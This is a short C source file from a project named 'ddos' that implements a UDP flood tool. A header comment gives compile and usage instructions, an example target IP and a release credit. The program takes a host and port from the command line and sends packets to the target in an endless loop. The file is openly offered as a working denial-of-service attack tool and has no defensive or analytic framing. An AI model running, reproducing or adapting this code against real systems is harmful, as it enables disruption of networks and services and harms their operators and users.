//
//  main.c
//  ddos
//
//  Created by ibokan on 15/11/26.
//  Copyright © 2015年 ibokan. All rights reserved.
//

/*
 compilation : gcc udp.c -o nom
 utilisation  ( use ): ./nom ip port
 exemple d'utilisation ( example of use ): ./udp 80.70.60.50 80
 fonctionne sous linux ( works ): Debian, sunOS, BSD, kernel 2.2x avec gcc 4.x ou plus
 RELEASE BY &sup2;DSK ™ // d-sk@live.fr // If you add an update thank you for giving me this please // ENJOY
 */

#define UDP_STRING "level-23"
#define UDP_SIZE 9

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>

int connection(char *, short);

int connection(char *serveur, short port)
{
    struct sockaddr_in udp;
    struct hostent *bbs;
    int initsocket;
    bbs = gethostbyname(serveur);
    if (bbs==NULL) {
        printf("host inconnu: %s\n",serveur);
        exit(0);
    }
    printf("Innondation de paquet UDP sur %s:%d\n ", serveur, port);
    bzero((char*) &udp,sizeof(udp));
    bcopy(bbs->h_addr, (char *) &udp.sin_addr, bbs->h_length);
    udp.sin_family = bbs->h_addrtype;
    udp.sin_port = htons(port);
    initsocket = socket(AF_INET, SOCK_DGRAM, 0);
    connect(initsocket,(struct sockaddr *) &udp, sizeof(udp));
    return initsocket;
}


int main(int argc, char **argv)
{
    int i;
    if(argc != 3)
    {
        fprintf(stderr, "Utilisation: %s ip port\n",argv[0]);
        exit(0);
    }
    i=connection(argv[1], atoi(argv[2]));
    for(;;)
    {
        send(i, UDP_STRING, UDP_SIZE, 0);
    }
}